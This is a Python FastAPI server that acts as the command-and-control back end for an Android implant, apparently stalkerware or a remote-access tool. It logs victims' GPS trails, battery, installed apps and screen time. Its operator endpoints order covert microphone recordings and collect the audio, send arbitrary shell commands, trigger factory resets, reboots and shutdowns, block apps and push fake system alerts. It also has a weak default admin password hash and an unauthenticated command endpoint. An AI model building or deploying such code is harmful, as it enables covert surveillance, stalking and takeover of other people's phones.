import sqlite3
import time
import secrets
import hashlib
import os
import math
import shutil
import threading
from typing import Optional
from contextlib import asynccontextmanager
from fastapi import FastAPI, Form, Request, Depends, HTTPException, status, UploadFile, File, Body
from fastapi.staticfiles import StaticFiles
from fastapi.responses import JSONResponse, FileResponse, RedirectResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi import WebSocket, WebSocketDisconnect
import json

class ConnectionManager:
    def __init__(self):
        self.active_connections: dict[str, WebSocket] = {}

    async def connect(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.active_connections[client_id] = websocket

    def disconnect(self, client_id: str):
        if client_id in self.active_connections:
            del self.active_connections[client_id]

    async def send_task(self, client_id: str, task_dict: dict):
        if client_id in self.active_connections:
            await self.active_connections[client_id].send_text(json.dumps(task_dict))

ws_manager = ConnectionManager()





DB_FILE = "telemetry.db"
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD_HASH = os.getenv("ADMIN_HASH")

if not ADMIN_PASSWORD_HASH:
    # Default fallback placeholder for deployment initialization
    ADMIN_PASSWORD_HASH = "03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4"  # SHA-256 of "1234"

IMPLANT_KEY = os.getenv("IMPLANT_KEY", "DeltaForce2027")

def haversine(lat1: float, lon1: float, lat2: float, lon2: float) -> float:
    R = 6371000.0  # Radius of Earth in meters
    dLat = math.radians(lat2 - lat1)
    dLon = math.radians(lon2 - lon1)
    a = math.sin(dLat / 2)**2 + math.cos(math.radians(lat1)) * math.cos(math.radians(lat2)) * math.sin(dLon / 2)**2
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
    return R * c

def init_db():
    """Initializes the database schema on system startup."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("PRAGMA journal_mode=WAL;")
    c.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            level INTEGER,
            lat REAL,
            lon REAL,
            timestamp TEXT,
            unix_time REAL,
            ping_interval INTEGER DEFAULT 5,
            record_audio INTEGER DEFAULT 0,
            record_duration INTEGER DEFAULT 30,
            notif_state INTEGER DEFAULT 0,
            notif_text TEXT DEFAULT '',
            blocked_apps TEXT DEFAULT '',
            location_tracking INTEGER DEFAULT 1,
            installed_apps TEXT DEFAULT '',
            screen_time_minutes INTEGER DEFAULT 0,
            charging INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            level INTEGER,
            lat REAL,
            lon REAL,
            timestamp TEXT,
            unix_time REAL
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS daily_screen_time (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            date TEXT,
            minutes INTEGER DEFAULT 0,
            updated_at REAL,
            UNIQUE(device_id, date)
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS battery_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            level INTEGER,
            timestamp TEXT,
            unix_time REAL,
            gap_seconds INTEGER DEFAULT 0
        )
    """)
    try:
        c.execute("ALTER TABLE devices ADD COLUMN play_audio INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass
    
    try:
        c.execute("ALTER TABLE devices ADD COLUMN reboot_cmd INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass
        
    try:
        c.execute("ALTER TABLE devices ADD COLUMN shutdown_cmd INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass

    try:
        c.execute("ALTER TABLE devices ADD COLUMN screen_time_minutes INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass

    try:
        c.execute("ALTER TABLE devices ADD COLUMN charging INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass
    
    c.execute("CREATE INDEX IF NOT EXISTS idx_history_device_id ON history(device_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_history_unix_time ON history(unix_time)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_daily_screen_time_device_date ON daily_screen_time(device_id, date)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_battery_history_device_id ON battery_history(device_id)")
    
    conn.commit()
    conn.close()

# Global connection pool
global_db_conn = sqlite3.connect(DB_FILE, check_same_thread=False)
global_db_conn.row_factory = sqlite3.Row
global_db_conn.execute("PRAGMA journal_mode=WAL;")

def get_db():
    """Returns the persistent thread-safe DB connection instead of creating a new one per request."""
    return global_db_conn

LAST_CLEANUP = 0
CLEANUP_INTERVAL = 86400  # Run cleanup at most once per day
REQUEST_COUNTER = 0

def run_auto_cleanup(db: sqlite3.Connection):
    global LAST_CLEANUP
    now = time.time()
    if now - LAST_CLEANUP > CLEANUP_INTERVAL:
        LAST_CLEANUP = now
        seven_days_ago = now - (7 * 86400)
        
        # 1. Delete history older than 7 days
        c = db.cursor()
        c.execute("DELETE FROM history WHERE unix_time < ?", (seven_days_ago,))
        db.commit()
        
        # 2. Delete unflagged audio older than 7 days
        if os.path.exists("static/audio"):
            for f in os.listdir("static/audio"):
                if f.endswith(".wav") and "_FLAG" not in f:
                    try:
                        # Extract timestamp: fake_android_99_1779379052.wav
                        parts = f.split('_')
                        ts = int(parts[-1].split('.')[0])
                        if ts < seven_days_ago:
                            os.remove(os.path.join("static/audio", f))
                    except:
                        pass

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Setup infrastructure folders and verify DB structure on start
    os.makedirs("static/audio", exist_ok=True)
    os.makedirs("templates", exist_ok=True)
    init_db()
    yield

app = FastAPI(lifespan=lifespan)

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_id = f"client_{id(websocket)}"
    try:
        while True:
            raw_data = await websocket.receive_text()
            try:
                import json
                data = json.loads(raw_data)
                
                if data.get("implant_key") != IMPLANT_KEY:
                    continue

                if "device_id" in data:
                    client_id = data["device_id"]
                    global ws_manager
                    ws_manager.active_connections[client_id] = websocket
                    
                    import sqlite3, time
                    conn = sqlite3.connect(DB_FILE)
                    c = conn.cursor()
                    now_unix = time.time()
                    time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
                    
                    c.execute("SELECT level, lat, lon, installed_apps, location_tracking, screen_time_minutes, charging FROM devices WHERE device_id=?", (client_id,))
                    existing = c.fetchone()
                    exists = existing is not None
                    
                    apps = data.get("installed_apps", existing[3] if existing else "")
                    
                    screen_time_minutes = None
                    if "screen_time_minutes" in data:
                        try:
                            screen_time_minutes = int(data.get("screen_time_minutes", 0))
                        except Exception:
                            screen_time_minutes = 0
                    elif "screen_time_hours" in data or "screen_time_mins" in data:
                        try:
                            hours = int(data.get("screen_time_hours", 0))
                            mins = int(data.get("screen_time_minutes", data.get("screen_time_mins", 0)))
                            screen_time_minutes = max(0, hours * 60 + mins)
                        except Exception:
                            screen_time_minutes = 0
                    elif isinstance(data.get("screen_time"), str):
                        parts = data.get("screen_time", "").split(":" )
                        try:
                            if len(parts) == 2:
                                screen_time_minutes = int(parts[0]) * 60 + int(parts[1])
                            elif len(parts) == 1:
                                screen_time_minutes = int(parts[0])
                        except Exception:
                            screen_time_minutes = 0

                    battery_val = data.get("battery", existing[0] if existing else 0)
                    lat_val = data.get("lat", existing[1] if existing else 0.0)
                    lon_val = data.get("lon", existing[2] if existing else 0.0)
                    loc_state_val = data.get("loc_state", existing[4] if existing else 1)
                    charging_val = data.get("charging", existing[6] if existing else 0)
                    if isinstance(charging_val, str) and charging_val.isdigit():
                        charging_val = int(charging_val)
                    current_screen_time = screen_time_minutes if screen_time_minutes is not None else (existing[5] if existing else 0)

                    # Record battery history only when the battery level changes
                    if not existing or battery_val != existing[0]:
                        c.execute("SELECT unix_time FROM battery_history WHERE device_id = ? ORDER BY id DESC LIMIT 1", (client_id,))
                        last_batt_row = c.fetchone()
                        gap_seconds = 0
                        if last_batt_row:
                            gap_seconds = int(now_unix - last_batt_row[0])
                        c.execute('''INSERT INTO battery_history (device_id, level, timestamp, unix_time, gap_seconds)
                                     VALUES (?, ?, ?, ?, ?)''',
                                  (client_id, battery_val, time_str, now_unix, gap_seconds))

                    if exists:
                        if "loc_state" in data:
                            c.execute('''UPDATE devices SET level=?, lat=?, lon=?, timestamp=?, unix_time=?, installed_apps=?, location_tracking=?, screen_time_minutes=?, charging=?
                                         WHERE device_id=?''', 
                                      (battery_val, lat_val, lon_val, time_str, now_unix, apps, loc_state_val, current_screen_time, charging_val, client_id))
                        else:
                            c.execute('''UPDATE devices SET level=?, lat=?, lon=?, timestamp=?, unix_time=?, installed_apps=?, screen_time_minutes=?, charging=?
                                         WHERE device_id=?''', 
                                      (battery_val, lat_val, lon_val, time_str, now_unix, apps, current_screen_time, charging_val, client_id))
                    else:
                        c.execute('''INSERT INTO devices (device_id, level, lat, lon, timestamp, unix_time, installed_apps, screen_time_minutes, charging)
                                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                                  (client_id, battery_val, lat_val, lon_val, time_str, now_unix, apps, current_screen_time, charging_val))

                    if screen_time_minutes is not None:
                        date_str = time.strftime('%Y-%m-%d', time.localtime())
                        c.execute('SELECT id FROM daily_screen_time WHERE device_id = ? AND date = ?', (client_id, date_str))
                        if c.fetchone():
                            c.execute('UPDATE daily_screen_time SET minutes = ?, updated_at = ? WHERE device_id = ? AND date = ?', (screen_time_minutes, now_unix, client_id, date_str))
                        else:
                            c.execute('INSERT INTO daily_screen_time (device_id, date, minutes, updated_at) VALUES (?, ?, ?, ?)', (client_id, date_str, screen_time_minutes, now_unix))
                    
                    if loc_state_val == 1 and "lat" in data and "lon" in data:
                        c.execute('''INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time)
                                     VALUES (?, ?, ?, ?, ?, ?)''',
                                  (client_id, battery_val, lat_val, lon_val, time_str, now_unix))
                    
                    conn.commit()
                    conn.close()
            except Exception as e:
                print(f'Error processing WS data: {e}')
    except WebSocketDisconnect:
        if client_id:
            ws_manager.disconnect(client_id)


app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False, # HARDENED: Browsers reject wildcard origins combined with true credentials
    allow_methods=["*"],
    allow_headers=["*"],
)

# Mount static media storage
app.mount("/static", StaticFiles(directory="static"), name="static")

def verify_session(request: Request) -> bool:
    """Verifies access authorization cookied headers."""
    token = request.cookies.get("session_token")
    if not token or token != ADMIN_PASSWORD_HASH:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Unauthorized")
    return True

@app.post("/api/login")
async def api_login(username: str = Form(...), password: str = Form(...)):
    hashed_input = hashlib.sha256(password.encode()).hexdigest()
    if username == ADMIN_USERNAME and secrets.compare_digest(hashed_input, ADMIN_PASSWORD_HASH):
        response = RedirectResponse(url="/", status_code=status.HTTP_303_SEE_OTHER)
        response.set_cookie(key="session_token", value=ADMIN_PASSWORD_HASH, httponly=True, samesite="strict")
        return response
    return HTMLResponse("<p style='color:red; text-align:center; margin-top:50px;'>Authentication failure. Invalid Key Ring.</p>", status_code=401)

@app.get("/login", response_class=FileResponse)
async def serve_login():
    return FileResponse("templates/login.html", media_type="text/html")

@app.get("/", response_class=FileResponse)
async def serve_index(request: Request):
    try:
        verify_session(request)
    except HTTPException:
        return RedirectResponse(url="/login")
    return FileResponse("templates/index.html", media_type="text/html")

@app.get("/history_view", response_class=FileResponse)
async def history_view(request: Request):
    try:
        verify_session(request)
    except HTTPException:
        return RedirectResponse(url="/login")
    return FileResponse("templates/history.html", media_type="text/html")

@app.post("/battery_report")
async def receive_report(
    implant_key: str = Form(...),
    device_id: str = Form(...),
    level: int = Form(...),
    lat: float = Form(...),
    lon: float = Form(...),
    db: sqlite3.Connection = Depends(get_db)
):
    global REQUEST_COUNTER
    REQUEST_COUNTER += 1
    if REQUEST_COUNTER % 100 == 0:
        run_auto_cleanup(db)
    
    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
        return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)
        
    current_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    now_unix = time.time()
    
    c = db.cursor()
    c.execute("SELECT ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd FROM devices WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    
    if row:
        ping_interval = row["ping_interval"]
        record_audio = row["record_audio"]
        record_duration = row["record_duration"]
        notif_state = row["notif_state"]
        notif_text = row["notif_text"]
        play_audio = row["play_audio"]
        reboot_cmd = row["reboot_cmd"]
        shutdown_cmd = row["shutdown_cmd"]
        
        c.execute("""
            UPDATE devices 
            SET level = ?, lat = ?, lon = ?, timestamp = ?, unix_time = ? 
            WHERE device_id = ?
        """, (level, lat, lon, current_time_str, now_unix, device_id))
    else:
        ping_interval = 5
        record_audio = 0
        record_duration = 30
        notif_state = 0
        notif_text = ""
        play_audio = 0
        reboot_cmd = 0
        shutdown_cmd = 0
        c.execute("""
            INSERT INTO devices (device_id, level, lat, lon, timestamp, unix_time, ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (device_id, level, lat, lon, current_time_str, now_unix, ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd))
        
    # Reset one-time power commands after they are successfully fetched by the implant
    if reboot_cmd == 1 or shutdown_cmd == 1:
        c.execute("UPDATE devices SET reboot_cmd = 0, shutdown_cmd = 0 WHERE device_id = ?", (device_id,))
        
    c.execute("""
        INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (device_id, level, lat, lon, current_time_str, now_unix))
    
    db.commit()
    
    return {
        "status": "success",
        "next_ping_seconds": ping_interval,
        "record_audio": record_audio,
        "notification_command": notif_state,
        "notification_text": notif_text,
        "play_audio": play_audio,
        "reboot_cmd": reboot_cmd,
        "shutdown_cmd": shutdown_cmd
    }

@app.get("/devices")
async def get_devices(request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("SELECT device_id FROM devices ORDER BY device_id ASC")
    rows = c.fetchall()
    return {"devices": [r["device_id"] for r in rows]}

@app.get("/check_commands")
async def check_commands(device_id: str, db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("SELECT ping_interval, record_audio, notif_state, notif_text, play_audio FROM devices WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    if row:
        return dict(row)
    return {}

@app.get("/stats")
async def get_stats(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    
    activity_state = "Stationary"
    is_online = False
    
    if row:
        c.execute("SELECT lat, lon, unix_time FROM history WHERE device_id = ? ORDER BY id DESC LIMIT 2", (device_id,))
        points = c.fetchall()
        if len(points) == 2:
            dist = haversine(points[1]["lat"], points[1]["lon"], points[0]["lat"], points[0]["lon"])
            time_diff = abs(points[0]["unix_time"] - points[1]["unix_time"])
            if time_diff > 0 and (dist / time_diff) > 1.5:  # 1.5m/s (walking pace) ignores GPS drift
                activity_state = "Moving"
                
        c.execute("SELECT unix_time FROM history WHERE device_id = ? ORDER BY id DESC LIMIT 1", (device_id,))
        lt_row = c.fetchone()
        if lt_row and lt_row['unix_time'] and (time.time() - lt_row['unix_time'] < 180):
            is_online = True
            
    if row:
        result = dict(row)
        result["activity"] = activity_state
        result["is_online"] = is_online
        return result
        
    return {"level": "0", "timestamp": "Waiting for devices...", "is_online": False}

@app.get("/history")
async def get_history(device_id: str, request: Request, hours: float = 0, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    if hours > 0:
        threshold = time.time() - (hours * 3600)
        c.execute("SELECT lat, lon FROM history WHERE device_id = ? AND unix_time >= ? ORDER BY id DESC LIMIT 1000", (device_id, threshold))
    else:
        c.execute("SELECT lat, lon FROM history WHERE device_id = ? ORDER BY id DESC LIMIT 500", (device_id,))
    rows = c.fetchall()
    return {"path": [[r["lat"], r["lon"]] for r in rows]}

@app.get("/history_detailed")
async def get_history_detailed(
    device_id: str, 
    request: Request,
    start_time: Optional[float] = None, 
    end_time: Optional[float] = None,
    page: int = 1,
    per_page: int = 500,
    db: sqlite3.Connection = Depends(get_db)
):
    verify_session(request)
    c = db.cursor()
    offset = (page - 1) * per_page
    if start_time and end_time:
        c.execute("""
            SELECT lat, lon, level, timestamp, unix_time 
            FROM history 
            WHERE device_id = ? AND unix_time >= ? AND unix_time <= ? 
            ORDER BY id DESC
            LIMIT ? OFFSET ?
        """, (device_id, start_time, end_time, per_page, offset))
    else:
        c.execute("SELECT lat, lon, level, timestamp, unix_time FROM history WHERE device_id = ? ORDER BY id DESC LIMIT ? OFFSET ?", (device_id, per_page, offset))
        
    rows = c.fetchall()
    
    # Get total count for pagination
    if start_time and end_time:
        c.execute("SELECT COUNT(*) FROM history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?", (device_id, start_time, end_time))
    else:
        c.execute("SELECT COUNT(*) FROM history WHERE device_id = ?", (device_id,))
    total = c.fetchone()[0]
    
    return {
        "history": [{"lat": r["lat"], "lon": r["lon"], "level": r["level"], "time": r["timestamp"], "unix_time": r["unix_time"]} for r in rows],
        "total": total,
        "page": page,
        "per_page": per_page,
        "total_pages": math.ceil(total / per_page) if total > 0 else 1
    }

@app.get("/battery_history")
async def battery_history(
    device_id: str,
    request: Request,
    start_time: Optional[float] = None,
    end_time: Optional[float] = None,
    page: int = 1,
    per_page: int = 200,
    db: sqlite3.Connection = Depends(get_db)
):
    verify_session(request)
    c = db.cursor()
    offset = (page - 1) * per_page
    if start_time and end_time:
        c.execute("SELECT level, timestamp, unix_time, gap_seconds FROM battery_history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ? ORDER BY id DESC LIMIT ? OFFSET ?", (device_id, start_time, end_time, per_page, offset))
        rows = c.fetchall()
        c.execute("SELECT COUNT(*) FROM battery_history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?", (device_id, start_time, end_time))
    else:
        c.execute("SELECT level, timestamp, unix_time, gap_seconds FROM battery_history WHERE device_id = ? ORDER BY id DESC LIMIT ? OFFSET ?", (device_id, per_page, offset))
        rows = c.fetchall()
        c.execute("SELECT COUNT(*) FROM battery_history WHERE device_id = ?", (device_id,))
    total = c.fetchone()[0]
    return {
        "history": [{"level": r["level"], "time": r["timestamp"], "unix_time": r["unix_time"], "gap_seconds": r["gap_seconds"]} for r in rows],
        "total": total,
        "page": page,
        "per_page": per_page,
        "total_pages": math.ceil(total / per_page) if total > 0 else 1
    }

@app.get("/screen_time_summary")
async def screen_time_summary(device_id: str, date: Optional[str] = None, request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    if not date:
        date = time.strftime('%Y-%m-%d', time.localtime())

    c = db.cursor()
    c.execute("SELECT minutes, updated_at FROM daily_screen_time WHERE device_id = ? AND date = ?", (device_id, date))
    row = c.fetchone()
    if row:
        return {"device_id": device_id, "date": date, "minutes": row["minutes"], "updated_at": row["updated_at"]}
    return {"device_id": device_id, "date": date, "minutes": 0, "updated_at": None}

@app.post("/set_ping")
async def set_ping(device_id: str = Form(...), seconds: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET ping_interval = ? WHERE device_id = ?", (seconds, device_id))
    db.commit()
    return {"status": "success"}

@app.post("/set_interval")
async def set_interval(device_id: str = Form(...), interval: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET ping_interval = ? WHERE device_id = ?", (interval, device_id))
    db.commit()
    if device_id in ws_manager.active_connections:
        try:
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "set_interval", "interval": interval}))
        except:
            pass
    return {"status": "success"}

@app.post("/set_notification")
async def set_notification(device_id: str = Form(...), state: int = Form(...), text: str = Form(""), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET notif_state = ?, notif_text = ? WHERE device_id = ?", (state, text, device_id))
    db.commit()
    if device_id in ws_manager.active_connections:
        try:
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "system_alert", "state": state, "text": text}))
        except:
            pass
    return {"status": "success"}

@app.post("/set_audio")
async def set_audio(device_id: str = Form(...), play_audio: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET play_audio = ? WHERE device_id = ?", (play_audio, device_id))
    db.commit()
    if device_id in ws_manager.active_connections and play_audio == 1:
        try:
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "audio_blast", "play": play_audio}))
        except:
            pass
    return {"status": "success"}

@app.post("/set_record_audio")
async def set_record_audio(device_id: str = Form(...), record_audio: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET record_audio = ? WHERE device_id = ?", (record_audio, device_id))
    db.commit()
    if device_id in ws_manager.active_connections and record_audio == 1:
        try:
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "mic_record", "record": record_audio}))
        except:
            pass
    return {"status": "success"}

@app.post("/set_power_cmd")
async def set_power_cmd(device_id: str = Form(...), action: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    if action == "reboot":
        c.execute("UPDATE devices SET reboot_cmd = 1 WHERE device_id = ?", (device_id,))
    elif action == "shutdown":
        c.execute("UPDATE devices SET shutdown_cmd = 1 WHERE device_id = ?", (device_id,))
    db.commit()
    if device_id in ws_manager.active_connections:
        try:
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "power_cmd", "action": action}))
        except:
            pass
    return {"status": "success"}


@app.post("/run_shell_command")
async def run_shell_command(device_id: str = Form(...), command: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    if device_id in ws_manager.active_connections:
        try:
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "shell", "command": command}))
        except:
            pass
    return {"status": "success"}


@app.post("/set_factory_reset")
async def set_factory_reset(device_id: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    if device_id in ws_manager.active_connections:
        try:
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "factory_reset"}))
        except:
            pass
    return {"status": "success"}


@app.post("/check_location_state")
async def check_location_state(request: Request, device_id: str = Form(...)):
    if not verify_session(request):
        return HTMLResponse(status_code=401)
    if device_id in ws_manager.active_connections:
        try:
            import json
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "check_location_state"}))
        except:
            pass
    return JSONResponse({"status": "sent"})

@app.post("/request_installed_apps")
async def request_installed_apps(request: Request, device_id: str = Form(...)):
    if not verify_session(request):
        return HTMLResponse(status_code=401)
    if device_id in ws_manager.active_connections:
        try:
            import json
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "refresh_installed_apps"}))
        except:
            pass
    return JSONResponse({"status": "sent"})

@app.post("/set_location_tracking")
async def set_location_tracking(request: Request, device_id: str = Form(...), enable: int = Form(...)):
    if not verify_session(request):
        return HTMLResponse(status_code=401)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE devices SET location_tracking=? WHERE device_id=?", (enable, device_id))
    conn.commit()
    conn.close()
    
    # Notify WS if active
    if device_id in ws_manager.active_connections:
        try:
            import json
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "set_location", "track": enable}))
        except:
            pass
    return JSONResponse({"status": "success"})

@app.get("/logout")
async def logout():
    response = RedirectResponse(url="/login", status_code=status.HTTP_303_SEE_OTHER)
    response.delete_cookie(key="session_token")
    return response


@app.post("/set_blocked_apps")
async def set_blocked_apps(request: Request, payload: dict = Body(...)):
    if not verify_session(request):
        return HTMLResponse(status_code=401)
    device_id = payload.get('device_id')
    apps = payload.get('apps', '')
    if not device_id:
        return JSONResponse({"status": "error", "detail": "device_id is required"}, status_code=422)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE devices SET blocked_apps=? WHERE device_id=?", (apps, device_id))
    conn.commit()
    conn.close()
    
    # Push to WS if connected
    if device_id in ws_manager.active_connections:
        try:
            import json
            await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "update_blocked_apps", "apps": apps}))
        except:
            pass
            
    return JSONResponse({"status": "success"})

@app.post("/delete_device")
async def delete_device(device_id: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
    c.execute("DELETE FROM history WHERE device_id = ?", (device_id,))
    db.commit()
    return {"status": "success"}

@app.post("/stop_server")
async def stop_server(request: Request):
    verify_session(request)

    def _shutdown():
        time.sleep(0.5)
        os._exit(0)

    threading.Thread(target=_shutdown, daemon=True).start()
    return JSONResponse({"status": "success", "message": "Server shutdown initiated."})

@app.post("/upload_audio")
async def upload_audio(
    implant_key: str = Form(...),
    device_id: str = Form(...),
    file: Optional[UploadFile] = File(None),
    error: Optional[str] = Form(None),
    db: sqlite3.Connection = Depends(get_db)
):
    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
        return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)
        
    # HARDENED: Prevent relative path traversal exploits (e.g. device_id = "../../../etc")
    safe_device_id = "".join(c for c in device_id if c.isalnum() or c in ("-", "_")).strip()
    if not safe_device_id:
        safe_device_id = "unknown"
        
    c = db.cursor()

    if error == "busy":
        filename = f"static/audio/{safe_device_id}_{int(time.time())}_BUSY.txt"
        with open(filename, "w") as f:
            f.write("Microphone was busy by another app - 0.0s recorded")
        c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (device_id,))
    elif file:
        filename = f"static/audio/{safe_device_id}_{int(time.time())}.wav"
        with open(filename, "wb") as buffer:
            shutil.copyfileobj(file.file, buffer)
        c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (device_id,))

    db.commit()
    return {"status": "success"}

@app.get("/audio_files")
async def get_audio_files(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    files = []
    if os.path.exists("static/audio"):
        for f in os.listdir("static/audio"):
            if f.startswith(device_id) and (f.endswith(".wav") or f.endswith("BUSY.txt")):
                files.append(f"/static/audio/{f}")
    files.sort(reverse=True)
    return {"files": files}

@app.post("/delete_audio")
async def delete_audio(filename: str = Form(...), request: Request = Depends(verify_session)):
    safe_name = os.path.basename(filename)
    path = os.path.join("static/audio", safe_name)
    if os.path.exists(path):
        os.remove(path)
    return {"status": "success"}

@app.post("/flag_audio")
async def flag_audio(filename: str = Form(...), request: Request = Depends(verify_session)):
    safe_name = os.path.basename(filename)
    path = os.path.join("static/audio", safe_name)
    if os.path.exists(path):
        if "_FLAG" not in safe_name:
            new_path = path.replace(".wav", "_FLAG.wav")
            os.rename(path, new_path)
    return {"status": "success"}
